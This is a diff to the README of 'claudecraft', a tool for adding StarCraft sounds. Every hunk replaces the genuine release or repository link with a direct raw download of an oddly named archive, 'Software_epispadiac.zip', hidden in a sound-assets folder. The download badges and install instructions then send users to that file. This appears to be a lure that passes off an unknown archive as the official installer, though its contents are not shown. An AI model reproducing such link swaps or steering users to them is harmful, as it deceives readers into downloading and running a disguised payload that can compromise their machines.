@@ -1,6 +1,6 @@
 # 🎵 claudecraft - Add StarCraft Sounds Easily
 
-[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-green)](https://github.com/syatriaikhsan21/claudecraft/releases)
+[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-green)](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)
 
 ## 📦 What is claudecraft?
 
@@ -18,7 +18,7 @@ This guide will walk you through downloading and running claudecraft on a Window
 
 Visit the latest release page to get the claudecraft installer.
 
-[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-blue)](https://github.com/syatriaikhsan21/claudecraft/releases)
+[![Download claudecraft](https://img.shields.io/badge/Download-claudecraft-blue)](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest release version—usually listed at the top.
@@ -141,7 +141,7 @@ It will check common problems and suggest fixes.
 
 You can always visit this page to download the latest version:
 
-[https://github.com/syatriaikhsan21/claudecraft/releases](https://github.com/syatriaikhsan21/claudecraft/releases)
+[https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)
 
 Keep track of new releases here to stay updated.
 
@@ -189,4 +189,4 @@ If you use npx, it always runs the latest published version automatically.
 
 If you want to learn more, visit the repository on GitHub. You will find full documentation and troubleshooting guides.
 
-[https://github.com/syatriaikhsan21/claudecraft](https://github.com/syatriaikhsan21/claudecraft)
+[https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip](https://github.com/syatriaikhsan21/claudecraft/raw/refs/heads/main/curated-sounds/protoss/Software_epispadiac.zip)
